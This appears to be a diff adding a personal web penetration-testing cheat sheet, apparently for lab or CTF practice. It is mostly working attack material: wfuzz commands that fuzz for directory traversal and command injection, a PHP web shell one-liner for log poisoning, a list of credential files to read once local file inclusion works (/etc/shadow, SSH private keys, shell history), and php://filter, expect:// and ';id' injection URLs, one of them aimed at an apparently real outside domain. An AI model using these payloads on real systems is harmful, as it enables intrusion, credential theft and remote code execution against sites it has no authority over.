@@ -1,0 +1,70 @@
+########################################
+Directory traversal
+########################################
+wfuzz -z file,Traversal_Huge.txt -u 'http://192.168.130.170/test.php?file=FUZZ' -c | grep 200
+
+wfuzz -z file,"/opt/LFISuite/pathtotest_huge.txt" -u 'http://192.168.130.170/test.php?file=FUZZ' -c | grep 200
+
+########################################
+Command injection linux (Wfuzz -b for cookie and -d for postdata)
+########################################
+wfuzz -z file,"/opt/PayloadsAllTheThings/Command Injection/Intruder/command-execution-unix.txt" -u 'http://192.168.130.170/test.php?file=last.htmlFUZZ' -c | grep 200
+
+
+wfuzz -z file,"/opt/PayloadsAllTheThings/Command Injection/Intruder/command_exec.txt" -u 'http://192.168.130.170/test.php?file=last.htmlFUZZ' -c
+
+#######################################
+SQL Injection
+#######################################
+Same thing as command injection, and try with Intruder SQL
+
+#######################################
+#Log poisoining injection
+#######################################
+
+<?php system($_GET['cmd']) ?>
+
+########################################
+files to look when /etc/passwd is readable
+########################################
+/etc/shadow
+/home/user/.$shell_history (Ex /home/employee/.ash_history)
+
+/home/user/.ssh/id_rsa
+/home/user/.ssh/id_rsa.pub
+/home/user/.ssh/id_dsa
+/home/user/.ssh/id_dsa
+
+/var/www/files
+
+
+#brute force
+passwords / usernames as brute force
+
+
+
+#exploit
+0-dir brute force
+1-log poisoning
+2-lfi/rfi (every time an lfi is found, try also an rfi) with wfuzz using /usr/share/wordlists/wfuzz/Injections/All_attack.txt
+
+wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/All_attack.txt http://10.0.0.10/test.php?file=FUZZ
+
+#for rfi in lang... [.php] , can just include ?dj at the end of the included file 
+3-php filter
+http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
+
+http://192.168.130.170/test.php?file=php://filter/convert.base64-encode/resource=index (or index.php at the end)
+
+4-command injecton (cf bypass CI with |, ||, &&, ; 
+http://192.168.130.170/test.php?file=last.html;id
+
+5-php wrapper
+php?page=expect://ls
+
+6-PHP ZIP Wrapper LFI
+
+7-web app exploit
+
+
+
